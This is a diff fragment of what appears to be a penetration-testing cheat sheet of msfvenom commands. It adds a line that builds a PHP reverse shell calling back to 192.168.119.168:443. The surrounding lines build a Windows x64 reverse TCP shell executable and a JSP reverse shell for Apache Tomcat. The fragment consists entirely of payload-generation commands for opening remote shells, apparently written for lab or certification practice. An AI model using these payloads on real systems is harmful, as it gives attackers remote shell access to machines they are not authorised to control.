@@ -396,6 +396,10 @@ https://github.com/frizb/MSF-Venom-Cheatsheet
 ````
 msfvenom -p windows/x64/shell_reverse_tcp LHOST=<your kali IP> LPORT=<port you designated> -f exe -o ~/shell.exe
 ````
+###
+````
+msfvenom -p php/reverse_php LHOST=192.168.119.168 LPORT=443 -f raw > shell.php
+```
 ### Windows 64 bit apache tomcat
 ````
 msfvenom -p java/jsp_shell_reverse_tcp LHOST=192.168.119.168 LPORT=80 -f raw > shell.jsp
